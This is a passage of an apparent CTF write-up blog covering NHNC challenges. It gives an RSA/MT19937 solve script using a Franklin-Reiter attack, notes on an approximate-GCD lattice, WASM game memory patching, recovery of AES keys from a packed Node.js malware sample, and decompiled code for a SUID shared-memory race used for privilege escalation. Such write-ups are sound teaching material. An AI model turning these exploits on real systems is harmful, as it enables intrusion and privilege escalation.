<li>Difficuly: 7&#x2F;10</li>
<li>Tips: MT19937 + Franklin-Reiter Attacks</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">65</span></span><br><span class="line">FLAG = bytes_to_long(<span class="string">b&#x27;NHNC&#123;errors_lead_to_lll_huh_?_what_are_u_thinking_about&#125;&#x27;</span>)</span><br><span class="line">e = <span class="number">37</span></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> ((p-<span class="number">1</span>)*(q-<span class="number">1</span>)) % e == <span class="number">0</span> :</span><br><span class="line">    p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=== ICEDTEA Verifier 1.1 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    OTP = getrandbits(SIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(OTP, e, N)&#125;</span>&quot;</span>)</span><br><span class="line">    TRIAL = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;OTP: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> TRIAL == OTP:</span><br><span class="line">        super_secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(FLAG + super_secret, e, N)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Invalid OTP, <span class="subst">&#123;OTP&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>Just note that we’ll obtain 65 bits random numbers everytime, and flag will be masked by addition then encrypt.  </p>
<p>With two addition(linear related) ciphertexts, it’s well known to perform Franklin-Reiter Attack, its principle is changing the relations into polynomials and GCD them under Zmod(N).<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter</span><br><span class="line"><span class="keyword">from</span> gf2bv <span class="keyword">import</span> LinearSystem</span><br><span class="line"><span class="keyword">from</span> gf2bv.crypto.mt <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timeit</span>(<span class="params">task_name</span>):</span><br><span class="line">    start = perf_counter()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        end = perf_counter()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;task_name&#125;</span> took <span class="subst">&#123;end - start:<span class="number">.2</span>f&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, a, b, e, n</span>):</span><br><span class="line">    <span class="comment"># 在模 n 上建立一元多項式環</span></span><br><span class="line">    PR = PolynomialRing(Zmod(n), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    x = PR.gen()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 兩條多項式</span></span><br><span class="line">    g1 = x**e - c1</span><br><span class="line">    g2 = (a*x + b)**e - c2</span><br><span class="line">    g2 = g2.monic()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gcd</span>(<span class="params">f, g</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> g.is_zero():</span><br><span class="line">            f, g = g, f % g</span><br><span class="line">        <span class="keyword">return</span> f.monic()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 計算 GCD，並回傳 -多項式的常數項</span></span><br><span class="line">    gg = _gcd(g1, g2)</span><br><span class="line">    <span class="keyword">return</span> -gg[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">bs = <span class="number">65</span></span><br><span class="line">effective_bs = ((bs - <span class="number">1</span>) &amp; bs) <span class="keyword">or</span> bs</span><br><span class="line">samples = <span class="number">624</span> * <span class="number">32</span> // effective_bs + <span class="number">800</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chal.78727867.xyz&#x27;</span>, <span class="number">31338</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;127.0.0.1&#x27;, 7777)</span></span><br><span class="line"></span><br><span class="line">opts = []</span><br><span class="line">sign = []</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(samples)):</span><br><span class="line">    sign.append(<span class="built_in">int</span>(r.recvline().decode().strip().split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>]))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;OTP: &#x27;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line">    tmp = <span class="built_in">int</span>(r.recvline().strip().split(<span class="string">b&#x27;, &#x27;</span>)[<span class="number">1</span>].decode())</span><br><span class="line">    opts.append(tmp)</span><br><span class="line"></span><br><span class="line">lin = LinearSystem([<span class="number">32</span>] * <span class="number">624</span>)</span><br><span class="line">mt = lin.gens()</span><br><span class="line">rng = MT19937(mt)</span><br><span class="line"><span class="keyword">with</span> timeit(<span class="string">&quot;generate system&quot;</span>):</span><br><span class="line">    zeros = [rng.getrandbits(bs) ^ o <span class="keyword">for</span> o <span class="keyword">in</span> opts] + [mt[<span class="number">0</span>] ^ <span class="number">0x80000000</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;solving...&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> timeit(<span class="string">&quot;solve_one&quot;</span>):</span><br><span class="line">    sol = lin.solve_one(zeros)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;solved&quot;</span>, sol[:<span class="number">10</span>])</span><br><span class="line">rng = MT19937(sol)</span><br><span class="line">pyrand = rng.to_python_random()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(rng.getrandbits(bs) == o <span class="keyword">for</span> o <span class="keyword">in</span> opts)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(pyrand.getrandbits(bs) == o <span class="keyword">for</span> o <span class="keyword">in</span> opts)</span><br><span class="line"></span><br><span class="line">opt1 = rng.getrandbits(bs)</span><br><span class="line">s1 = rng.getrandbits(<span class="number">1024</span>)</span><br><span class="line">opt2 = rng.getrandbits(bs)</span><br><span class="line">s2 = rng.getrandbits(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(opt1, opt2)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OTP: &#x27;</span>, <span class="built_in">str</span>(opt1).encode())</span><br><span class="line">line = r.recvline().decode().strip()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">c1 = <span class="built_in">int</span>(line.split()[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">N = reduce(math.gcd, [<span class="built_in">pow</span>(opts[i], <span class="number">37</span>) - sign[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N: <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OTP: &#x27;</span>, <span class="built_in">str</span>(opt2).encode())</span><br><span class="line">line = r.recvline().decode().strip()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">c2 = <span class="built_in">int</span>(line.split()[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>(attack(c1, c2 , <span class="number">1</span>, s2 - s1, <span class="number">37</span>, N))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m - s1))</span><br></pre></td></tr></table></figure>


<h3 id="🐺-Verifier-Max"><a href="#🐺-Verifier-Max" class="headerlink" title="🐺 Verifier Max"></a>🐺 Verifier Max</h3><ul>
<li>Difficuly: 8&#x2F;10</li>
<li>Tips: MT19937 + Franklin-Reiter Attacks + AGCD</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">65</span></span><br><span class="line">FLAG = bytes_to_long(<span class="string">b&#x27;NHNC&#123;can_u_come_up_with_an_idea_for_verifier_turbo?!&#125;&#x27;</span>)</span><br><span class="line">e = <span class="number">37</span></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> ((p-<span class="number">1</span>)*(q-<span class="number">1</span>)) % e == <span class="number">0</span> :</span><br><span class="line">    p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=== ICEDTEA Verifier 1.2 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    OTP = getrandbits(SIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(OTP, e, N) &gt;&gt; SIZE&#125;</span>&quot;</span>)</span><br><span class="line">    TRIAL = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;OTP: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> TRIAL == OTP:</span><br><span class="line">        super_secret = getrandbits(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;signed: <span class="subst">&#123;<span class="built_in">pow</span>(FLAG + super_secret, e, N)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Invalid OTP, <span class="subst">&#123;OTP&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>DIFF: signatures losing their last 65 bits.<br>This is a AGCD Problem this time.<br>If you haven’t seen that before, I strongly recommend to see some posts like: <a target="_blank" rel="noopener" href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/</a><br>It’s principle is to turn the relation into a linear equation which roots are much more smaller than coefficients, just a classic LLL condition.  </p>
<p>An easy construct of lattices may be like this:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[sign_1^37-OTP_1, -1, 0</span><br><span class="line">sign_2^37-OTP_2, 0, 1]</span><br></pre></td></tr></table></figure>
<p>it should came up with something like <code>(sign_1^37-OTP_1)//N&#39;</code>, the N’ value may be like N*(small number), just do it more times and GCD them.  </p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Yep, a crypto&amp;web player auditing reverse challenges, somehow is because someone delayed…<br><img src="https://hackmd.io/_uploads/HJVEcRdrge.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/Hy6L9RdHge.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/Skq9sAOSgx.png" alt="image"></p>
<h3 id="Yep-another-smake-game"><a href="#Yep-another-smake-game" class="headerlink" title="Yep another smake game"></a>Yep another smake game</h3><ul>
<li>Difficuly: 3&#x2F;10</li>
<li>Tips: Godot, WASM Game Hacking</li>
</ul>
<p>yep, another snake game.<br>Via view-source or F-12 console logs, we can easily spot that’s a godot game.<br>There’re a bunch of Godot unpackers online, but actually I made this challenge after I saw this:  </p>
<iframe width="1172" height="659" src="https://www.youtube.com/embed/Sa1QzhPNHTc" title="Jack Baker - Hacking WebAssembly Games with Binary Instrumentation - DEF CON 27 Conference" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
  
<p>What’s more, there’s a tool based on this talk, just with the same usage with CheatEngine…  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/Qwokka/Cetus">https://github.com/Qwokka/Cetus</a>  </p>
<p>With this issue, we learned how to modify values!<br><a target="_blank" rel="noopener" href="https://github.com/Qwokka/Cetus/issues/76">https://github.com/Qwokka/Cetus/issues/76</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cetus.<span class="title function_">modifyMemory</span>(<span class="number">0x0186c950</span>, <span class="number">1333337</span>, <span class="string">&quot;i32&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/r1YWfytSge.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/H13xMyFrlx.png" alt="image">  </p>
<h3 id="IECD-SHELL"><a href="#IECD-SHELL" class="headerlink" title="IECD-SHELL"></a>IECD-SHELL</h3><ul>
<li>Difficuly: 3&#x2F;10</li>
<li>Tips: NodeJs, Malware</li>
</ul>
<p>A malware+packet was provided  </p>
<p><img src="https://hackmd.io/_uploads/SyAcEytSlx.png" alt="image">  </p>
<p>Seems to be a nodejs pkg packed exe<br>unpack via <a target="_blank" rel="noopener" href="https://github.com/LockBlock-dev/pkg-unpacker/tree/master">https://github.com/LockBlock-dev/pkg-unpacker/tree/master</a>, found AES Key and method (CBC)  </p>
<p><img src="https://hackmd.io/_uploads/SkikHkKBgl.png" alt="image">  </p>
<p>AES CBC Mode is based on key + IV  </p>
<p>let’s see more … <del>because I’m to lazy to read those js byte codes XD</del><br>open the pcapng file with WireShark, follow TCP Streams, the client first sent a 16 bytes string to the machine, then they start comunication… ?!  </p>
<p><img src="https://hackmd.io/_uploads/HkYMLyKHgg.png" alt="image">  </p>
<p>The string probably be the IV value XD<br><img src="https://hackmd.io/_uploads/BygzPkKBxg.png" alt="image">  </p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><img src="https://hackmd.io/_uploads/Hy9j51Frgx.png" alt="image"></p>
<h3 id="Server-Status-and-revenge"><a href="#Server-Status-and-revenge" class="headerlink" title="Server Status (and revenge)"></a>Server Status (and revenge)</h3><ul>
<li>Difficuly: 4&#x2F;10</li>
<li>Tips: Shared Memory Attack</li>
</ul>
<p>A privilege escalation challenge with a SUID TOCTOU in it, and yep, this challenge was made in a hurry so I made some stupid mistakes.  </p>
<p>Decompile the program via IDA.  </p>
<p>When the program started  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Server Status Monitor v1.0 ===&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;System diagnostic tool with root privileges\n&quot;</span>);</span><br><span class="line">  v3 = sub_15B0(<span class="string">&quot;dmesg&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to store command in shared memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    sub_17B0();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Initializing...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hacking Nasa...&quot;</span>);</span><br><span class="line">    sub_1760();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    v5 = sub_1680(v4);</span><br><span class="line">    v6 = (<span class="type">void</span> *)v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_1870(v5) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(v6);</span><br><span class="line">        sub_1720(v4);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nSystem status check completed successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Command execution failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(v6);</span><br><span class="line">        sub_1720(v4);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to retrieve command from shared memory&quot;</span>);</span><br><span class="line">      sub_1720(v4);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_15B0</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v2);</span><br><span class="line">  v3 = rand() % <span class="number">0xFFFFF</span>;</span><br><span class="line">  v4 = shmget(v3, <span class="number">0x400</span>uLL, <span class="number">950</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">-1</span>;</span><br><span class="line">    perror(<span class="string">&quot;shmget failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="type">char</span> *)shmat(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">-1</span>;</span><br><span class="line">      perror(<span class="string">&quot;shmat failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strncpy</span>(v5, src, <span class="number">0x3FF</span>uLL);</span><br><span class="line">      v6[<span class="number">1023</span>] = <span class="number">0</span>;</span><br><span class="line">      shmdt(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It gets a shared memory block with a key_t generated by rand via time(NULL) as seed, and puts our command <code>dmesg</code> into it.  </p>
<p>Later it will run the command after a short period of sleep  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1760</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    putc(<span class="number">42</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    usleep(<span class="number">0xC350</span>u);</span><br><span class="line">    --v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 );</span><br><span class="line">  <span class="keyword">return</span> putc(<span class="number">10</span>, <span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Last, it will just run the shared memory block as a command.  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1870</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v1; <span class="comment">// rax</span></span><br><span class="line">  FILE *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-428h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+408h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = popen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Command Output ===&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( fgets(v4, <span class="number">1024</span>, v2) )</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== End of Output ===&quot;</span>);</span><br><span class="line">    pclose(v2);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  